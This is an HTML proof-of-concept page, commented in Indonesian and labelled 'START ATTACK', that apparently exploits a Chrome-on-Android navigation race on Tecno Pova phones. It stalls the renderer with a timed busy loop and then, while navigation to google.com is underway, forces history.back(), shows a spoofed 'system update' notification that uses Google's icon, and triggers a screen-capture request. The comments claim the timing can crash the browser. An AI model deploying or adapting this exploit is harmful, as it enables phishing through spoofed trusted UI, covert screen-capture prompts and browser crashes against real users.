<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zombie-Pova-V1</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; }
        .btn { background: #0f0; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; border-radius: 10px; }
        #status { margin-top: 20px; font-size: 12px; border-left: 2px solid #0f0; padding-left: 10px; }
        #progress { width: 0%; height: 5px; background: #0f0; margin-top: 10px; transition: width 0.1s; }
    </style>
</head>
<body>
    <h2>FARISSAL B - ZOMBIE</h2>
    <button class="btn" onclick="startExploit()">START ATTACK</button>
    <div id="progress"></div>
    <div id="status">Ready...</div>

    <script>
        function logger(m) { document.getElementById('status').innerHTML += "<br>> " + m; }

        async function startExploit() {
            // 1. Minta izin Notifikasi (Wajib buat buktiin UI Hijack)
            const perm = await Notification.requestPermission();
            if (perm !== "granted") return alert("Izin notifikasi dibutuhkan!");

            logger("Targeting: google.com...");
            
            // 2. Navigasi Awal
            location.href = "https://www.google.com";

            // 3. OPTIMIZED TIMING FOR POVA 7 (G99)
            // Kita pake loop 1.8 detik (Timing paling pas buat Android Mid-range)
            // Kalau lo rasa Chrome lo terlalu cepet pindah, naikin ke 2200.
            const STALL_TIME = 1800; 
            const start = Date.now();
            
            logger("Stalling renderer thread...");
            while (Date.now() - start < STALL_TIME) {
                // Micro-loop: Biar CPU sibuk tapi nggak sampe bikin OS Force Close
                document.getElementById('progress').style.width = 
                    ((Date.now() - start) / STALL_TIME * 100) + "%";
            }

            // 4. THE ZOMBIE CALL
            // Dieksekusi tepat saat Chrome lagi "bingung" pindah proses
            setTimeout(() => {
                // Perintah 1: Paksa balik (Hijack)
                history.back(); 
                
                // Perintah 2: Kirim Notifikasi Spoof
                new Notification("Sistem Update", {
                    body: "Google Chrome perlu diperbarui di Tecno Pova anda.",
                    icon: "https://www.google.com/favicon.ico"
                });

                // Perintah 3: Popup Media (The Money Shot)
                // Ini yang paling sering bikin "Segmentation Fault" kalau timing pas
                if (navigator.mediaDevices.getDisplayMedia) {
                    navigator.mediaDevices.getDisplayMedia({video:true}).catch(e=>{});
                }
                
                logger("Zombie commands sent!");
            }, 100); // Delay sangat tipis setelah stall
        }

        // Deteksi kalau masuk 'alam gaib' (BFCache)
        window.onpagehide = (e) => {
            if (e.persisted) logger("IN BFCACHE!");
        };
    </script>
</body>
</html>
